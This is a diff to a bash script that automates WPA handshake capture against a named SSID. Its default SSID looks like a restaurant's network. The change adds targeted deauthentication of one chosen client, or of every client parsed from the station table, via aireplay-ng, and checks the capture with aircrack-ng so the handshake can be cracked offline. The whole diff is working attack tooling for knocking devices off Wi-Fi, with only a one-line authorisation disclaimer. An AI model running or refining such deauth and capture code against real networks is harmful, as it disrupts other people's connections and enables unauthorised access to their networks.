@@ -2,12 +2,18 @@
 # quick-capture.sh - one-shot automated handshake capture for ONE target SSID.
 # Deletes existing cap-* files for that target, re-captures, verifies.
 # Use ONLY on networks you own / are authorized to test.
+# Usage: sudo $0 <iface> '<SSID>' [secs] [client_mac]
+#   client_mac (optional) = TARGETED deauth of one client. When omitted, every
+#                           client in the station table is deauth'd targeted.
 set -uo pipefail
 
 IFACE="${1:-wlp2s0}"
 SSID="${2:-KKOCHI SAMGYUP - 2.4G}"
 OUT="/root/lab"
 CAPSECS="${3:-45}"
+# Optional 4th arg: client MAC for TARGETED deauth (far more effective than
+# broadcast; broadcast is ignored by many modern clients / PMF).
+CLIENT="${4:-}"
 
 red(){ printf "\033[1;31m%s\033[0m\n" "$*"; }
 green(){ printf "\033[1;32m%s\033[0m\n" "$*"; }
@@ -172,8 +178,28 @@ sleep 4
 OK=0
 for i in $(seq 1 $((CAPSECS/5))); do
     if [[ $((i % 2)) -eq 1 ]]; then
-        echo "   [$((i*5))s] deauth-3 (broadcast)"
-        aireplay-ng -0 3 -a "$BSSID" "$MON_IF" >/dev/null 2>&1 || true
+        if [[ -n "$CLIENT" ]]; then
+            echo "   [$((i*5))s] targeted deauth-3 -> $CLIENT"
+            aireplay-ng -0 3 -a "$BSSID" -c "$CLIENT" "$MON_IF" >/dev/null 2>&1 || true
+        else
+            # "all clients": targeted-deauth every client in the station table;
+            # broadcast is widely ignored, so only fall back to it if none listed.
+            snd=0; ST_MAC=()
+            while IFS= read -r sl; do
+                [[ "$sl" == *"Station MAC"* ]] && { snd=1; continue; }
+                [[ $snd -eq 1 ]] || continue
+                [[ "$sl" =~ ^[0-9A-Fa-f:]{17} ]] && ST_MAC+=("$(cut -d, -f1 <<<"$sl" | tr -d ' ')")
+            done < "$OUT/cap-$page-01.csv"
+            if [[ ${#ST_MAC[@]} -gt 0 ]]; then
+                for SM in "${ST_MAC[@]}"; do
+                    aireplay-ng -0 3 -a "$BSSID" -c "$SM" "$MON_IF" >/dev/null 2>&1 || true
+                done
+                echo "   [$((i*5))s] targeted deauth of ${#ST_MAC[@]} client(s)"
+            else
+                echo "   [$((i*5))s] deauth-3 (broadcast)"
+                aireplay-ng -0 3 -a "$BSSID" "$MON_IF" >/dev/null 2>&1 || true
+            fi
+        fi
     fi
     sleep 5
     if aircrack-ng "$OUT/cap-$page-01.cap" 2>/dev/null | grep -q 'WPA ([1-9]'; then
@@ -191,6 +217,9 @@ else
     yellow "    Causes: no client connected to AP, client farther than AP, or weak monitor RX."
     yellow "    -> connect a device (phone) to '$SSID' first, move closer, re-run:"
     yellow "    sudo $0 $IFACE '$SSID' 90"
+    if [[ -z "$CLIENT" ]]; then
+        yellow "    Tip: pass the client MAC as arg 4 for a TARGETED deauth of that device."
+    fi
     if command -v tshark >/dev/null; then
         yellow "    EAPOL frames seen in capture: $(tshark -r "$OUT/cap-$page-01.cap" -Y eapol 2>/dev/null | wc -l)"
     fi
